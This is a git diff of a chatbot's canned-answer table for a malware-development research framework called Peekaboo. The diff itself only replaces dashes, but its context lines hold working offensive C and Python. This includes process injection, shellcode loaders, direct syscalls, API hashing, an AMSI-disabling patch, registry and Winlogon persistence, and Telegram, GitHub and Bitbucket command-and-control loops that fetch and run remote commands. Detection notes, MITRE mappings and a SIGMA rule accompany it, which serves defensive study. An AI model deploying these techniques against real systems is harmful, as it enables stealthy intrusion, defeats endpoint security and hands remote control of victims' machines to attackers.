@@ -415,7 +415,7 @@ _CANNED: list[tuple[str, str]] = [
     # -- What is Peekaboo ------------------------------------------------------
     (
         r"what is peekaboo|what('s| is) this (framework|tool|project)|explain peekaboo",
-        """## Peekaboo — APT Simulation Framework
+        """## Peekaboo - APT Simulation Framework
 
 **Peekaboo** is an open-source threat simulation and malware development research framework by **@cocomelonc**, designed to bridge offensive research with defensive implementation.
 
@@ -465,11 +465,11 @@ Every module ships with a matching blog post explaining mechanics, telemetry, an
         r"process inject|injection technique|virtualalloc|enumerate desktop|apc inject",
         """## Process Injection Techniques
 
-Peekaboo covers five injection primitives — each with a different EDR detection profile.
+Peekaboo covers five injection primitives - each with a different EDR detection profile.
 
 ---
 
-### 1. Classic VirtualAllocEx + CreateRemoteThread (`injection-1`) — T1055.001
+### 1. Classic VirtualAllocEx + CreateRemoteThread (`injection-1`) - T1055.001
 
 The textbook injection. Heavily monitored but still effective against legacy EDRs.
 
@@ -493,9 +493,9 @@ CloseHandle(hProc);
 
 ---
 
-### 2. EnumDesktopsA callback (`injection-2`) — T1055.012
+### 2. EnumDesktopsA callback (`injection-2`) - T1055.012
 
-Shellcode runs inside a legitimate `user32.dll` callback — no remote thread created.
+Shellcode runs inside a legitimate `user32.dll` callback - no remote thread created.
 
 ```c
 LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
@@ -508,11 +508,11 @@ EnumDesktopsA(GetProcessWindowStation(),
               (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
 ```
 
-**Detection:** `VirtualAlloc(RWX)` immediately followed by `EnumDesktopsA` — unusual pair; Sysmon EID 7 (ImageLoad) won't fire, but memory-scanning EDRs can catch the RWX page.
+**Detection:** `VirtualAlloc(RWX)` immediately followed by `EnumDesktopsA` - unusual pair; Sysmon EID 7 (ImageLoad) won't fire, but memory-scanning EDRs can catch the RWX page.
 
 ---
 
-### 3. APC Injection (`injection-3`) — T1055.004
+### 3. APC Injection (`injection-3`) - T1055.004
 
 Queues shellcode as an Asynchronous Procedure Call into an alertable thread.
 
@@ -526,7 +526,7 @@ LPVOID mem = VirtualAllocEx(hProc, NULL, payload_len,
                             PAGE_EXECUTE_READWRITE);
 WriteProcessMemory(hProc, mem, payload, payload_len, NULL);
 
-// queue APC — fires when thread enters alertable wait
+// queue APC - fires when thread enters alertable wait
 // (SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx)
 QueueUserAPC((PAPCFUNC)mem, hThread, NULL);
 
@@ -534,7 +534,7 @@ QueueUserAPC((PAPCFUNC)mem, hThread, NULL);
 ResumeThread(hThread);
 ```
 
-**Detection:** `QueueUserAPC` targeting threads in remote processes; use ETW provider `Microsoft-Windows-Kernel-Process` — Sysmon doesn't log this natively.
+**Detection:** `QueueUserAPC` targeting threads in remote processes; use ETW provider `Microsoft-Windows-Kernel-Process` - Sysmon doesn't log this natively.
 
 ---
 
@@ -546,7 +546,7 @@ ResumeThread(hThread);
         r"telegram c2|telegram bot|c2 channel|command and control",
         """## Telegram C2 Channel (`c2-telegram-1`)
 
-Peekaboo uses Telegram's Bot API as a covert C2 channel — all traffic is legitimate HTTPS to `api.telegram.org`.
+Peekaboo uses Telegram's Bot API as a covert C2 channel - all traffic is legitimate HTTPS to `api.telegram.org`.
 
 ### Architecture
 
@@ -596,7 +596,7 @@ void c2_loop(void) {
 }
 ```
 
-### Binary delivery — operator side (Python)
+### Binary delivery - operator side (Python)
 
 ```python
 import requests
@@ -616,12 +616,12 @@ drop_binary("builds/implant_enc.exe")
 
 **Why it evades detection:**
 - Traffic is valid HTTPS to `api.telegram.org` (widely whitelisted CDN)
-- No custom C2 domain — nothing to blocklist
+- No custom C2 domain - nothing to blocklist
 - Beaconing interval jitter mimics human interaction
 
 **MITRE:** T1102 (Web Service), T1071.001 (App Layer Protocol), T1105 (Ingress Tool Transfer)
 
-**Detection:** Sysmon EID 3 — network connections to `api.telegram.org` from non-Telegram processes; consistent beaconing interval (e.g., every 5 s exactly); `InternetOpenUrlA` call stack tracing via ETW."""
+**Detection:** Sysmon EID 3 - network connections to `api.telegram.org` from non-Telegram processes; consistent beaconing interval (e.g., every 5 s exactly); `InternetOpenUrlA` call stack tracing via ETW."""
     ),
 
     # -- AV / EDR Bypass -------------------------------------------------------
@@ -633,12 +633,12 @@ Peekaboo layers three primitives to reduce the EDR telemetry footprint.
 
 ---
 
-### 1. Direct Syscalls (`evasion-syscall-1`) — T1106, T1562.001
+### 1. Direct Syscalls (`evasion-syscall-1`) - T1106, T1562.001
 
 Most EDRs hook `ntdll.dll` exports in userland. Direct syscalls jump straight to the kernel, bypassing all hooks.
 
 ```c
-// Step 1 — extract the syscall stub number (SSN) from ntdll at runtime
+// Step 1 - extract the syscall stub number (SSN) from ntdll at runtime
 DWORD get_ssn(const char *func_name) {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     BYTE   *fn    = (BYTE *)GetProcAddress(ntdll, func_name);
@@ -651,7 +651,7 @@ DWORD get_ssn(const char *func_name) {
     return 0;
 }
 
-// Step 2 — inline asm stub for NtAllocateVirtualMemory (SSN = 0x18 on Win10)
+// Step 2 - inline asm stub for NtAllocateVirtualMemory (SSN = 0x18 on Win10)
 __asm__(
     "NtAllocVirt:          \n"
     "  mov  r10, rcx       \n"   // calling convention: rcx -> r10
@@ -663,9 +663,9 @@ __asm__(
 
 ---
 
-### 2. API Hashing (`evasion-hash-1`) — T1027.007
+### 2. API Hashing (`evasion-hash-1`) - T1027.007
 
-Resolve WinAPI functions by hash at runtime — no function name strings in the binary.
+Resolve WinAPI functions by hash at runtime - no function name strings in the binary.
 
 ```c
 // FNV-1a 32-bit hash
@@ -696,16 +696,16 @@ FARPROC resolve_by_hash(DWORD target) {
     return NULL;
 }
 
-// usage — no string "VirtualAlloc" appears in binary
+// usage - no string "VirtualAlloc" appears in binary
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
 auto VAlloc = (pVirtualAlloc)resolve_by_hash(0xd983e4a4);
 ```
 
 ---
 
-### 3. AMSI Patch (`evasion-amsi-1`) — T1562.001
+### 3. AMSI Patch (`evasion-amsi-1`) - T1562.001
 
-Overwrite the `AmsiScanBuffer` prologue to force `AMSI_RESULT_CLEAN` — disables PowerShell/VBScript scanning without unloading the DLL.
+Overwrite the `AmsiScanBuffer` prologue to force `AMSI_RESULT_CLEAN` - disables PowerShell/VBScript scanning without unloading the DLL.
 
 ```c
 void patch_amsi(void) {
@@ -724,9 +724,9 @@ void patch_amsi(void) {
 ```
 
 **Detection:**
-- `VirtualProtect` calls targeting `amsi.dll` address range — high signal
+- `VirtualProtect` calls targeting `amsi.dll` address range - high signal
 - Memory integrity scan of `amsi.dll` in running processes
-- ETW `Microsoft-Windows-AMSI/Operational` log — EID 1101 scan suppressed
+- ETW `Microsoft-Windows-AMSI/Operational` log - EID 1101 scan suppressed
 - RWX pages in non-system processes (catch-all)"""
     ),
 
@@ -735,11 +735,11 @@ void patch_amsi(void) {
         r"encrypt|encryption|speck|feal|mars|treyfer|xor|crypto|cipher|tea\b|xtea",
         """## Payload Encryption
 
-Peekaboo uses lightweight block ciphers to encrypt shellcode. All run in pure userland — zero CryptoAPI calls.
+Peekaboo uses lightweight block ciphers to encrypt shellcode. All run in pure userland - zero CryptoAPI calls.
 
 ---
 
-### XOR — baseline (simplest)
+### XOR - baseline (simplest)
 
 ```c
 void xor_crypt(unsigned char *buf, size_t len,
@@ -756,7 +756,7 @@ xor_crypt(payload, sizeof(payload), key, sizeof(key));
 
 ---
 
-### Speck-64/128 (`crypto-speck-1`) — NSA lightweight cipher
+### Speck-64/128 (`crypto-speck-1`) - NSA lightweight cipher
 
 Fast on ARM/x86; 27 rounds; 64-bit block, 128-bit key.
 
@@ -797,7 +797,7 @@ void speck_encrypt_buf(uint8_t *buf, size_t len,
 
 ---
 
-### TEA — Tiny Encryption Algorithm (`crypto-tea-1`)
+### TEA - Tiny Encryption Algorithm (`crypto-tea-1`)
 
 64-bit block, 128-bit key; 32 Feistel rounds; 15 lines of C.
 
@@ -830,7 +830,7 @@ void tea_decrypt(uint32_t v[2], const uint32_t k[4]) {
 
 **MITRE:** T1027 (Obfuscated Files or Information), T1140 (Deobfuscate/Decode at Runtime)
 
-**Detection:** Entropy analysis — encrypted blobs have Shannon entropy > 7.0 (vs ~4.5 for plaintext code). Tools: `binwalk -E`, Detect-It-Easy (die), PE-bear entropy view, YARA rules for high-entropy `.text` sections."""
+**Detection:** Entropy analysis - encrypted blobs have Shannon entropy > 7.0 (vs ~4.5 for plaintext code). Tools: `binwalk -E`, Detect-It-Easy (die), PE-bear entropy view, YARA rules for high-entropy `.text` sections."""
     ),
 
     # -- MITRE ATT&CK ---------------------------------------------------------
@@ -857,7 +857,7 @@ void tea_decrypt(uint32_t v[2], const uint32_t k[4]) {
 | C2 | T1102 | Web Service | telegram, bitbucket |
 | Exfiltration | T1041 | C2 channel exfil | stealer modules |
 
-### SIGMA rule — Registry Run key persistence
+### SIGMA rule - Registry Run key persistence
 
 ```yaml
 title: Suspicious Registry Run Key Written by Non-Standard Process
@@ -897,11 +897,11 @@ Use the **MITRE ATT&CK** panel to browse all 150+ technique groups and see which
         r"persistence|registry|run key|winlogon|startup|dll hijack|screensaver",
         """## Persistence Techniques
 
-Four primitives with escalating stealth — from noisy Run keys to silent DLL hijacks.
+Four primitives with escalating stealth - from noisy Run keys to silent DLL hijacks.
 
 ---
 
-### 1. Registry Run Key (`malware-pers-1`) — T1547.001
+### 1. Registry Run Key (`malware-pers-1`) - T1547.001
 
 Easiest and noisiest. Executes implant on every user logon.
 
@@ -931,7 +931,7 @@ set_run_key("WindowsDefenderUpdate",
 
 ---
 
-### 2. Winlogon Helper DLL (`malware-pers-2`) — T1547.004
+### 2. Winlogon Helper DLL (`malware-pers-2`) - T1547.004
 
 Requires admin. Injects into Winlogon shell on every interactive logon.
 
@@ -947,7 +947,7 @@ RegOpenKeyExA(HKEY_LOCAL_MACHINE,
 RegQueryValueExA(hKey, "Shell", NULL, NULL,
                  (BYTE*)current, &sz);
 
-// append path — Windows executes both
+// append path - Windows executes both
 char newval[600];
 snprintf(newval, sizeof(newval),
          "%s,C:\\\\ProgramData\\\\evil.exe", current);
@@ -960,7 +960,7 @@ RegCloseKey(hKey);
 
 ---
 
-### 3. Screensaver Hijacking (`malware-pers-4`) — T1546.002
+### 3. Screensaver Hijacking (`malware-pers-4`) - T1546.002
 
 No admin required. Replaces the screensaver binary path in user hive.
 
@@ -989,11 +989,11 @@ RegCloseKey(hKey);
         r"github c2|gist|github issue|bitbucket c2|covert channel",
         """## GitHub / Bitbucket Covert C2
 
-Both channels abuse legitimate developer platforms — defenders must block entire services to stop them.
+Both channels abuse legitimate developer platforms - defenders must block entire services to stop them.
 
 ---
 
-### GitHub Issues C2 (`c2-github-1`) — T1102, T1071.001
+### GitHub Issues C2 (`c2-github-1`) - T1102, T1071.001
 
 Operator posts commands as Issue comments; implant polls and parses them.
 
@@ -1011,7 +1011,7 @@ HINTERNET h = InternetOpenUrlA(hNet, GH_ENDPOINT,
 
 char buf[32768] = {0}; DWORD n = 0;
 InternetReadFile(h, buf, sizeof(buf) - 1, &n);
-// parse last element's "body" field — exec as shell command or download URL
+// parse last element's "body" field - exec as shell command or download URL
 const char *cmd = json_last_string(buf, "body");
 if (cmd && cmd[0] == '!') handle_command(cmd + 1);
 ```
@@ -1034,7 +1034,7 @@ requests.post(URL, headers=HEADERS,
 
 ---
 
-### Bitbucket C2 (`c2-bitbucket-1`) — T1102, T1132.001
+### Bitbucket C2 (`c2-bitbucket-1`) - T1102, T1132.001
 
 Implant polls a repo file; operator pushes new payload as a base64-encoded commit.
 
@@ -1065,7 +1065,7 @@ const char *url =
         r"shellcode|shellcod|shellcoding|msfvenom|payload dropp|loader",
         """## Shellcode Loading Techniques
 
-Three loaders with increasing stealth — from obvious RWX pages to W^X section mapping.
+Three loaders with increasing stealth - from obvious RWX pages to W^X section mapping.
 
 ---
 
@@ -1080,7 +1080,7 @@ unsigned char sc[] = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00...";
 int main(void) {
     LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
                               MEM_COMMIT | MEM_RESERVE,
-                              PAGE_EXECUTE_READWRITE);  // RWX — loud
+                              PAGE_EXECUTE_READWRITE);  // RWX - loud
     if (!mem) return 1;
     RtlMoveMemory(mem, sc, sizeof(sc));
     ((void(*)())mem)();   // call shellcode as function pointer
@@ -1088,14 +1088,14 @@ int main(void) {
 }
 ```
 
-**Detection:** `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` in a single call — highest signal; most EDRs alert immediately.
+**Detection:** `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` in a single call - highest signal; most EDRs alert immediately.
 
 ---
 
-### 2. W^X loader — write then flip permissions (medium noise)
+### 2. W^X loader - write then flip permissions (medium noise)
 
 ```c
-// 1. Allocate RW — never simultaneously writable AND executable
+// 1. Allocate RW - never simultaneously writable AND executable
 LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
                           MEM_COMMIT | MEM_RESERVE,
                           PAGE_READWRITE);
@@ -1116,12 +1116,12 @@ VirtualFree(mem, 0, MEM_RELEASE);
 
 ---
 
-### 3. NtMapViewOfSection loader — no VirtualAllocEx (low noise)
+### 3. NtMapViewOfSection loader - no VirtualAllocEx (low noise)
 
 ```c
 #include <winternl.h>
 
-// avoids VirtualAllocEx entirely — creates a named section object,
+// avoids VirtualAllocEx entirely - creates a named section object,
 // maps it RW, writes shellcode, remaps as RX
 HANDLE    hSection  = NULL;
 SIZE_T    viewSize  = 0;
@@ -1148,7 +1148,7 @@ NtMapViewOfSection(hSection, GetCurrentProcess(), &base,
 
 **MITRE:** T1055 (Process Injection), T1106 (Native API), T1027 (Obfuscated Payload)
 
-**Detection:** `NtCreateSection` + `NtMapViewOfSection` from non-system processes — low noise but catchable via ETW `Microsoft-Windows-Kernel-Memory`; memory integrity scanners walking VAD tree."""
+**Detection:** `NtCreateSection` + `NtMapViewOfSection` from non-system processes - low noise but catchable via ETW `Microsoft-Windows-Kernel-Memory`; memory integrity scanners walking VAD tree."""
     ),
 
     # -- AI providers ---------------------------------------------------------
@@ -1177,7 +1177,7 @@ User question
      │
      ▼  injected into qwen3:1.7b system prompt
      │
-     ▼  streamed answer (/no_think — fast mode)
+     ▼  streamed answer (/no_think - fast mode)
 ```
 
 ### Claude prompt-cache optimisation
@@ -1185,7 +1185,7 @@ User question
 The full knowledge base (~80 k tokens) is sent as a **cached system prompt block** (`cache_control: ephemeral`). It is only billed once per 5-minute TTL window, making multi-turn sessions ~90 % cheaper.
 
 ```python
-# chatbot.py — how the cache block is constructed
+# chatbot.py - how the cache block is constructed
 system = [
     {"type": "text", "text": _SYSTEM_BASE},
     {"type": "text", "text": kb_text,
